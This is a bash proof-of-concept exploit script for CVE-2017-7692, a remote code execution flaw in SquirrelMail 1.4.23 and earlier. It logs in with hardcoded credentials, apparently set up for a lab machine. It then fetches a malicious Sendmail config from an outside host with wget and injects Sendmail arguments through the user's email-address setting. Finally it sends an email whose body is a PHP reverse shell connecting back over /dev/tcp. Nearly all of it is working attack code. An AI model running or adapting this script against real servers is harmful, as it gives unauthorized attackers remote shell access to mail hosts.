#!/bin/bash
#
int='\033[94m
     __                     __   __  __           __
    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
 /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)

SquirrelMail_RCE_exploit.sh (ver. 1.1)

Discovered and coded by

Dawid Golunski (@dawid_golunski)
https://legalhackers.com

ExploitBox project:
https://ExploitBox.io

\033[0m'

# Quick and messy PoC for SquirrelMail webmail application.
# It contains payloads for 2 vectors:
# * File Write
# * RCE
# It requires user credentials and that SquirrelMail uses
# Sendmail method as email delivery transport
#
#
# Full advisory URL:
# https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html
# Exploit URL:
# https://legalhackers.com/exploits/CVE-2017-7692/SquirrelMail_RCE_exploit.sh
#
# Tested on: # Ubuntu 16.04
# squirrelmail package version:
# 2:1.4.23~svn20120406-2ubuntu1.16.04.1
#
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulns/exploitation?
# Stay tuned for my new project - ExploitBox
#
#                        .;lc'
#                    .,cdkkOOOko;.
#                 .,lxxkkkkOOOO000Ol'
#             .':oxxxxxkkkkOOOO0000KK0x:'
#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#             .':oxxxxxxxxx.ckkkkkkkkxl,.
#                 .,cdxxxxx.ckkkkkxc.
#                    .':odx.ckxl,.
#                        .,.'.
#
# https://ExploitBox.io
#
# https://twitter.com/Exploit_Box
#
# -----------------------------------------------------------------

sqspool="/var/spool/squirrelmail/attach/"

echo -e "$int"
#echo -e "\033[94m \nSquirrelMail - Remote Code Execution PoC Exploit (CVE-2017-7692) \n"
#echo -e "SquirrelMail_RCE_exploit.sh (ver. 1.0)\n"
#echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m\n\n"

URL="https://192.168.56.8/webmail"

# Log in
squser="laurie@borntosec.net"
sqpass="!q\]Ej?*5K5cy*AJ"

echo -e "\n\n[*] Logging in to SquirrelMail at $URL"
curl -k -s -D /tmp/sqdata -d"login_username=$squser&secretkey=$sqpass&js_autodetect_results=1&just_logged_in=1" $URL/src/redirect.php | grep -q incorrect
if [ $? -eq 0 ]; then
	echo "Invalid creds"
	exit 2
fi
sessid="`cat /tmp/sqdata | grep SQMSESS | tail -n1 | cut -d'=' -f2 | cut -d';' -f1`"
keyid="`cat /tmp/sqdata | grep key | tail -n1 | cut -d'=' -f2 | cut -d';' -f1`"


# Prepare Sendmail cnf
#
# * The config will launch php via the following stanza:
#
# Mlocal,	P=/usr/bin/php, F=lsDFMAw5:/|@qPn9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
# 		T=DNS/RFC822/X-Unix,
# 		A=php -- $u $h ${client_addr}
#
wget -q -O/tmp/smcnf-exp https://legalhackers.com/exploits/sendmail-exploit.cf

# Upload config
echo -e "\n\n[*] Uploading Sendmail config"
token="`curl -k -s -b"SQMSESSID=$sessid; key=$keyid" "$URL/src/compose.php?mailbox=INBOX&startMessage=1" | grep smtoken | awk -F'value="' '{print $2}' | cut -d'"' -f1 `"
attachid="`curl -k -H "Expect:" -s -b"SQMSESSID=$sessid; key=$keyid" -F"smtoken=$token" -F"send_to=$mail" -F"subject=attach" -F"body=test" -F"attachfile=@/tmp/smcnf-exp" -F"username=$squser" -F"attach=Add" $URL/src/compose.php | awk -F's:32' '{print $2}' | awk -F'"' '{print $2}' | tr -d '\n'`"

# Create Sendmail cmd string according to selected payload
echo -e "\n\n[?] Select payload\n"
# SELECT PAYLOAD
echo "1 - File write (into /tmp/sqpoc)"
echo "2 - Remote Code Execution (with the uploaded smcnf-exp + phpsh)"
echo
read -p "[1-2] " pchoice

case $pchoice in
	1) payload="$squser	-oQ/tmp/	-X/tmp/sqpoc"
	   ;;

	2) payload="$squser	-oQ/tmp/	-C$sqspool/$attachid"
	   ;;
esac

reverse_ip="192.168.1.84"
reverse_port=4242

# Reverse shell code
phprevsh="
<?php
	\$cmd = \"/bin/bash -c 'bash -i >/dev/tcp/$reverse_ip/$reverse_port 0<&1 2>&1 & '\";
	file_put_contents(\"/tmp/cmd\", 'export PATH=\"\$PATH\" ; export TERM=vt100 ;' . \$cmd);
	system(\"/bin/bash /tmp/cmd ; rm -f /tmp/cmd\");
?>"


# Set sendmail params in user settings
echo -e "\n[*] Injecting Sendmail command parameters"
token="`curl -k -s -b"SQMSESSID=$sessid; key=$keyid" "$URL/src/options.php?optpage=personal" | grep smtoken | awk -F'value="' '{print $2}' | cut -d'"' -f1 `"
curl -k -s -b"SQMSESSID=$sessid; key=$keyid" -d "smtoken=$token&optpage=personal&optmode=submit&submit_personal=Submit" --data-urlencode "new_email_address=$payload" "$URL/src/options.php?optpage=personal" | grep -q 'Success' 2>/dev/null
if [ $? -ne 0 ]; then
	echo "Failed to inject sendmail parameters"
	exit 2
fi

# Send email which triggers the RCE vuln and runs phprevsh
echo -e "\n[*] Sending the email to trigger the vuln"
sleep 2s
curl -k -s -D/tmp/sheaders -b"SQMSESSID=$sessid; key=$keyid" -d"smtoken=$token" -d"startMessage=1" -d"session=0" -d"send_to=$squser" -d"subject=poc" --data-urlencode "body=$phprevsh" -d"send=Send" -d"username=$squser" $URL/src/compose.php

grep -q "302 Found" /tmp/sheaders
if [ $? -eq 1 ]; then
	echo "There was a problem with sending email"
	exit 2
fi


# Done
echo -e "\n[*] All done. Exiting"


